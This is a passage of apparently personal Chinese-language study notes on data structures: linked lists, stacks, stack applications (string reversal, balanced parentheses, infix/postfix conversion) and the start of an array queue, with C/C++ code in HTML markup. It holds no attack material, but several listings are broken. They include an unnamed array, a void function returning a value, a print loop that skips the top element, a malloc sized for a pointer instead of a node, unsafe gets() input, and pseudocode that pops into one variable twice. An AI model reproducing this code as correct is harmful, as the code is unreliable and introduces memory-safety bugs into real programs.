function_">ReversePrint</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span>=</span>head;</span><br><span class="line">    <span class="keyword">if</span>(temp==<span class="literal">NULL</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">while</span>(temp-&gt;next!=<span class="literal">NULL</span>)&#123;<span class="comment">//gonig to last node</span></span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reverse: &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(temp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,temp-&gt;data);</span><br><span class="line">        temp=temp-&gt;prev;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    head =<span class="literal">NULL</span>;</span><br><span class="line">    InsertAtHead(<span class="number">2</span>);Print();ReversePrint();</span><br><span class="line">    InsertAtHead(<span class="number">4</span>);Print();ReversePrint();</span><br><span class="line">    InsertAtHead(<span class="number">6</span>);Print();ReversePrint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="栈-stack"><a href="#栈-stack" class="headerlink" title="栈(stack)"></a>栈(stack)</h2><p>当把栈作为一种抽象数据类型来讨论，我们只讨论特性和操作(feratures&#x2F;operations)，而不讨论具体实现(imprementeation)。</p>
<p><strong>Stack ADT</strong></p>
<blockquote>
<p>A list with the restriction that insertion and deletion can be pertormed only from one end ,called the top.</p>
</blockquote>
<p>LIFO(Last-In-First-Out)</p>
<p><strong>operations</strong></p>
<p>1.Push&#x2F;&#x2F;插入 2.pop&#x2F;&#x2F;弹出 3.Top&#x2F;&#x2F;返回栈顶元素 4.IsEmpty&#x2F;&#x2F;判断栈是否为空,空返回true</p>
<p><strong>时间复杂度为O(1)</strong></p>
<p><strong>Applications(应用场景)</strong></p>
<p>1.Function calls&#x2F;Recursion(执行函数)</p>
<p>2.undo in an editor(编辑器中撤回)</p>
<p>3.Balanced Parentheses(编译器平衡括号)</p>
<h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>arrays</p>
<p>linked lists</p>
<h4 id="基于数组实现栈"><a href="#基于数组实现栈" class="headerlink" title="基于数组实现栈"></a>基于数组实现栈</h4><p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-15 144108.png)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 101</span></span><br><span class="line"><span class="type">int</span> [MAX_SIZE];</span><br><span class="line"><span class="type">int</span> top=<span class="number">-1</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(top==MAX_SIZE<span class="number">-1</span>)&#123;<span class="comment">//处理溢出情况</span></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Error,stack overflow\n&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    A[++top]=x;<span class="comment">//top++; A[top]=x;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(top==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error:No element to pop\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">top</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> A[top];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;top;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,A[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    Push(<span class="number">2</span>);Print();</span><br><span class="line">    Push(<span class="number">5</span>);Print();</span><br><span class="line">    Push(<span class="number">10</span>);Print();</span><br><span class="line">    Pop();Print();</span><br><span class="line">    Push(<span class="number">12</span>);Print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="基于链表实现栈"><a href="#基于链表实现栈" class="headerlink" title="基于链表实现栈"></a>基于链表实现栈</h4><p>链表作为栈来使用，我们有两种选择</p>
<p><strong>Insert&#x2F;delete</strong> </p>
<p>-at end of list(tail) 因为要从头到尾遍历，所以时间复杂度为O(n)，不是常数时间</p>
<p>-at beginning of list (head) 时间复杂度为O(1),所以我们考虑实现这种插入</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">link</span>;</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">top</span>=</span><span class="literal">NULL</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span>=</span>(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node*));</span><br><span class="line">    temp-&gt;data=x;</span><br><span class="line">    temp-&gt;link=top;</span><br><span class="line">    top=temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Pop</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">temp</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (top== <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    temp=top;</span><br><span class="line">    top=top-&gt;link;</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">temp</span>;</span></span><br><span class="line">    temp=top;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack: &quot;</span>);</span><br><span class="line">   <span class="keyword">while</span>(temp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,temp-&gt;data);</span><br><span class="line">       temp=temp-&gt;link;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    Push(<span class="number">8</span>);Print();</span><br><span class="line">    Push(<span class="number">4</span>);Print();</span><br><span class="line">    Push(<span class="number">6</span>);Print();</span><br><span class="line">    Pop();Print();</span><br><span class="line">    Pop();Print();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="栈功能"><a href="#栈功能" class="headerlink" title="栈功能"></a>栈功能</h3><h4 id="1-Using-stack-to-reverse"><a href="#1-Using-stack-to-reverse" class="headerlink" title="1.Using stack to reverse"></a>1.Using stack to reverse</h4><p><strong>PROBLEM1 :Reverse a string</strong></p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-16 160011.png)</p>
<p>栈的特点是后入先出，所以向栈中压入一些元素，所有元素都在栈上，依次出栈，最后一个出栈的对应的是第一个入栈的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stack</span> <span class="comment">//可以是基于数组或量链表实现的栈</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">char</span> A[<span class="number">101</span>];</span><br><span class="line">    <span class="type">int</span> top;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;<span class="comment">//使用相关库函数去实现栈</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">IsEmpty</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> C[<span class="number">51</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>)</span><br><span class="line">        <span class="built_in">gets</span>(C);</span><br><span class="line">    <span class="built_in">Reverse</span>(C,<span class="built_in">strlen</span>(C));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Output: %s&quot;</span>,C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来用c++标准库的方式来实现字符串反转</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//string reversal using stack</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span> <span class="comment">//stack from standard template libraty (stl)</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std ;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Reverse</span><span class="params">(<span class="type">char</span> *C,<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt;S;<span class="comment">//C++中的标准模板库（STL）组件，定义了一个名为S的栈（stack），其中S存储char类型的元素</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//loop for push 这种情况下时间复杂度为O(n)</span></span><br><span class="line">        S.<span class="built_in">push</span>(C[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//loop for pop 这种情况下时间复杂度为O(n)</span></span><br><span class="line">        C[i]=S.<span class="built_in">top</span>();<span class="comment">//overwrite the character at index i</span></span><br><span class="line">        S.<span class="built_in">pop</span>(); <span class="comment">//perform  pop</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> C[<span class="number">51</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>); </span><br><span class="line">        <span class="built_in">gets</span>(C);</span><br><span class="line">    <span class="built_in">Reverse</span>(C,<span class="built_in">strlen</span>(C));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Output: %s&quot;</span>,C);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>PROBLEM2:Reverse a Linker List</strong></p>
<p>Iterative Solution    迭代: Time-O(n) Space-O(1)</p>
<p>Recursive Solution(Implicit Stack)  递归: Time-O(n) Space-O(n)</p>
<p>隐式地使用了栈</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">   </span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span>  data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Reverse</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    stack&lt;<span class="keyword">struct</span> Node*&gt;S;</span><br><span class="line">    <span class="keyword">while</span>(temp！=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        S.<span class="built_in">push</span>(temp);</span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp=S.<span class="built_in">top</span>();head=temp;</span><br><span class="line">    <span class="keyword">while</span>(!S.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        temp-&gt;next=S.<span class="built_in">top</span>();</span><br><span class="line">        S.<span class="built_in">pop</span>();</span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-Check-for-balanced-parentheses"><a href="#2-Check-for-balanced-parentheses" class="headerlink" title="2.Check for balanced parentheses"></a>2.Check for balanced parentheses</h4><p>parentheses:()or{}or[]</p>
<p>Expression:当表达式或字符串包含大小写字符，操作符，各种括号</p>
<blockquote>
<p>EXPRESSION             BALANCED</p>
<p>(A+B)                             YES</p>
<p>{(A+B)+(C+D)}               YES</p>
<p>{(x+y)*(z)                        NO</p>
<p>[2*3]+(A)]                       NO</p>
<p>{a+z)                               NO</p>
</blockquote>
<p>Solution:</p>
<p>scanf from left to right .if opening symbol,add it to a list;if closeing symbols, remove last opening symbol in list.should end witn an empty list.</p>
<p>伪代码逻辑思路</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Check Balanced <span class="title function_">Parebthesis</span><span class="params">(<span class="built_in">exp</span>)</span>&#123;</span><br><span class="line">    n&lt;-length(<span class="built_in">exp</span>)</span><br><span class="line">    Create a <span class="built_in">stack</span>:-S</span><br><span class="line">        <span class="keyword">for</span> i&lt;<span class="number">-0</span> to n<span class="number">-1</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">exp</span>[i] is <span class="string">&#x27;(&#x27;</span>or<span class="number">&#x27;</span>&#123;<span class="string">&#x27;or&#x27;</span>[&#x27;</span><br><span class="line">                push(<span class="built_in">exp</span>[i])</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">exp</span>[i]is <span class="string">&#x27;)&#x27;</span>or<span class="number">&#x27;</span>&#125;<span class="string">&#x27;or&#x27;</span>]&#x27;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (S is empty)||</span><br><span class="line">                &#123;</span><br><span class="line">                    top dose not <span class="built_in">pair</span> with <span class="built_in">exp</span>[i],</span><br><span class="line">                    <span class="keyword">return</span> flase</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> pop()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> S is empty? <span class="literal">true</span> or <span class="literal">false</span></span><br><span class="line">&#125;<span class="comment">//扫描结束栈为空</span></span><br></pre></td></tr></table></figure>

<p>源码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  使用堆栈检查表达式中平衡括号的 C++ 程序。</span></span><br><span class="line"><span class="comment">  给定一个由开始和结束字符组成的字符串表达式</span></span><br><span class="line"><span class="comment">  括号 - ()，大括号 - &#123;&#125; 和方括号 - []，我们需要</span></span><br><span class="line"><span class="comment">  检查符号是否平衡。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// Function to check whether two characters are opening 检查两个字符是否打开的函数</span></span><br><span class="line"><span class="comment">// and closing of same type. 和相同类型的关闭</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ArePair</span><span class="params">(<span class="type">char</span> opening,<span class="type">char</span> closing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(opening == <span class="string">&#x27;(&#x27;</span> &amp;&amp; closing == <span class="string">&#x27;)&#x27;</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(opening == <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; closing == <span class="string">&#x27;&#125;&#x27;</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(opening == <span class="string">&#x27;[&#x27;</span> &amp;&amp; closing == <span class="string">&#x27;]&#x27;</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">AreParanthesesBalanced</span><span class="params">(string exp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	stack&lt;<span class="type">char</span>&gt;  S;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;exp.<span class="built_in">length</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(exp[i] == <span class="string">&#x27;(&#x27;</span> || exp[i] == <span class="string">&#x27;&#123;&#x27;</span> || exp[i] == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">			S.<span class="built_in">push</span>(exp[i]);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(exp[i] == <span class="string">&#x27;)&#x27;</span> || exp[i] == <span class="string">&#x27;&#125;&#x27;</span> || exp[i] == <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(S.<span class="built_in">empty</span>() || !<span class="built_in">ArePair</span>(S.<span class="built_in">top</span>(),exp[i]))</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				S.<span class="built_in">pop</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> S.<span class="built_in">empty</span>() ? <span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*Code to test the function AreParanthesesBalanced*/</span></span><br><span class="line">	string expression;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;Enter an expression:  &quot;</span>; <span class="comment">// input expression from STDIN/Console来自 STDIN/Console 的输入表达式</span></span><br><span class="line">	cin&gt;&gt;expression;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">AreParanthesesBalanced</span>(expression))</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;Balanced\n&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;Not Balanced\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Infix-Postfix-Prefix"><a href="#Infix-Postfix-Prefix" class="headerlink" title="Infix, Postfix, Prefix"></a>Infix, Postfix, Prefix</h3><p>中缀，前缀，后缀</p>
<h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>就是对对算术和逻辑表达式的求值</p>
<p>​                                                           Infix 中缀表达式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2+3                         </span><br><span class="line">A-B                   &lt;operand&gt;&lt;operator&gt;&lt;operand&gt;操作数 操作符 操作数</span><br><span class="line">(P*2)</span><br></pre></td></tr></table></figure>

<p><strong>Order of operation</strong> (优先级)</p>
<ol>
<li>Parenthese () {} []</li>
<li>Exponents <strong>(right to left)</strong>   2^ 3 ^2&#x3D;2 ^9&#x3D;512</li>
<li>Multiplication and division(left to right)</li>
<li>Addition and Subtraction(left to right)</li>
</ol>
<p>​                                                            Prefix 前缀表达式</p>
<blockquote>
<p>+2 3                                                   </p>
<p>+A B</p>
<p>+a(*bc)       </p>
</blockquote>
<p>​                                                           Postfix 后缀表达式</p>
<blockquote>
<p>Index                                             Prefix                                                       Postfix</p>
<p>2+3                                                 +2 3                                                        2 3 +</p>
<p>p-q                                                  -p q                                                         p q-</p>
<p>a+b<em>c                                             +a( * bc)                                                abc</em> +    </p>
</blockquote>
<h4 id="求值"><a href="#求值" class="headerlink" title="求值"></a>求值</h4><p>**(Evaluation of Prefix and Postfix expressions)**前缀和后缀</p>
<p>后缀求值伪代码逻辑思路</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EvaluatePostfix(<span class="built_in">exp</span>)&#123;</span><br><span class="line">     creat a <span class="built_in">stack</span> S;</span><br><span class="line">    fori&lt;<span class="number">-0</span>to <span class="title function_">lenth</span><span class="params">(<span class="built_in">exp</span>)</span>-1</span><br><span class="line">    &#123;  <span class="keyword">if</span>(<span class="built_in">exp</span>[i]is operand)</span><br><span class="line">            push(<span class="built_in">exp</span>[i])</span><br><span class="line">         <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">exp</span>[i] is operator)</span><br><span class="line">         &#123;</span><br><span class="line">             op2&lt;-pop()</span><br><span class="line">             op2&lt;-pop()</span><br><span class="line">                 res&lt;-Perform(<span class="built_in">exp</span>[i],op1,op2)<span class="comment">//运算操作函数</span></span><br><span class="line">                 Push(res)</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> top of <span class="built_in">stack</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://gist.github.com/mycodeschool/7702441">源码</a></p>
<p><strong>Infix to Postfix</strong></p>
<p>第一种逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Infix   A+(B*C) -&gt; A+(BC*) -&gt; A(BC*)+ -&gt; ABC*+  Postfix</span><br></pre></td></tr></table></figure>

<p><a href="https://gist.github.com/mycodeschool/7702441">c++源码</a></p>
<p>第二种逻辑</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Infix <span class="title function_">ToPostfix</span><span class="params">(<span class="built_in">exp</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  Create a <span class="built_in">stack</span> S</span><br><span class="line">  res&lt;- expty <span class="built_in">string</span></span><br><span class="line">  <span class="keyword">for</span> i&lt;<span class="number">-0</span> to <span class="title function_">lenth</span><span class="params">(<span class="built_in">exp</span>)</span>-1</span><br><span class="line">  &#123;</span><br><span class="line">     <span class="keyword">if</span> <span class="built_in">exp</span>[i]is operand</span><br><span class="line">     res&lt;- res +<span class="built_in">exp</span>[i]</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">exp</span>[i] is operator&#123;</span><br><span class="line">     <span class="keyword">while</span> (s.expty()&amp;&amp; HasHigherPrec(s.top(),<span class="built_in">exp</span>[i]))</span><br><span class="line">     &#123;</span><br><span class="line">     res&lt;-res+S.top()</span><br><span class="line">     S.pop()</span><br><span class="line">     &#125;</span><br><span class="line">     S.Push(<span class="built_in">exp</span>[i])</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(!S.expty())</span><br><span class="line">  &#123;</span><br><span class="line">  res&lt;-res+s.top()</span><br><span class="line">  S.pop()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://gist.github.com/mycodeschool/7867739">c++源码</a></p>
<h2 id="队列-queues"><a href="#队列-queues" class="headerlink" title="队列(queues)"></a>队列(queues)</h2><p><strong>Queue</strong> -First-In-First-Out</p>
<p><strong>Stack</strong> -Last-In-First-Out</p>
<p>Queue ADP</p>
<blockquote>
<p>A list or collection with the restriction that insertion can be performed at one end (队尾) and deletion can be performed at other end (队头)</p>
</blockquote>
<p>Operations (O(1))</p>
<blockquote>
<ol>
<li>EnQueue(x) or Push(x)   -在队尾插入</li>
<li>DeQueue( ) or Pop( )    -在队头删除</li>
<li>Front( ) or Peek( )   -查看队头元素</li>
<li>IsEmpty( )   -判断是否为空</li>
</ol>
</blockquote>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-19 114948.png)</p>
<p>上图右边是队列的结构</p>
<p>Applications</p>
<blockquote>
<ol>
<li>Printer queue 打印机队列</li>
<li>Process scheduling 进程调度</li>
<li>simulating wait  模拟等待</li>
</ol>
</blockquote>
<h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><h4 id="使用数组实现队列"><a href="#使用数组实现队列" class="headerlink" title="使用数组实现队列"></a>使用数组实现队列</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>; </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 101  <span class="comment">//maximum size of the array that will store Queue. </span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Creating a class named Queue.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">private:</span><br><span class="line">	<span class="type">int</span> A[MAX_SIZE];</span><br><span class="line">	<span class="type">int</span> front, rear; </span><br><span class="line">public:</span><br><span class="line">	<span class="comment">// Constructor - set front and rear as -1. </span></span><br><span class="line">	<span class="comment">// We are assuming that for an empty Queue, both front and rear will be -1.</span></span><br><span class="line">	Queue()</span><br><span class="line">	&#123;</span><br><span class="line">		front = <span class="number">-1</span>; </span><br><span class="line">		rear = <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// To check wheter Queue is empty or not</span></span><br><span class="line">	<span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (front == <span class="number">-1</span> &amp;&amp; rear == <span class="number">-1</span>); </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// To check whether Queue is full or not</span></span><br><span class="line">	<span class="type">bool</span> <span class="title function_">IsFull</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (rear+<span class="number">1</span>)%MAX_SIZE == front ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Inserts an element in queue at rear end</span></span><br><span class="line">	<span class="type">void</span> <span class="title function_">Enqueue</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Enqueuing &quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot; \n&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(IsFull())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Error: Queue is Full\n&quot;</span>;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (IsEmpty())</span><br><span class="line">		&#123; </span><br><span class="line">			front = rear = <span class="number">0</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		    rear = (rear+<span class="number">1</span>)%MAX_SIZE;</span><br><span class="line">		&#125;</span><br><span class="line">		A[rear] = x;</span><br><span class="line">	&#125;</span><br><span 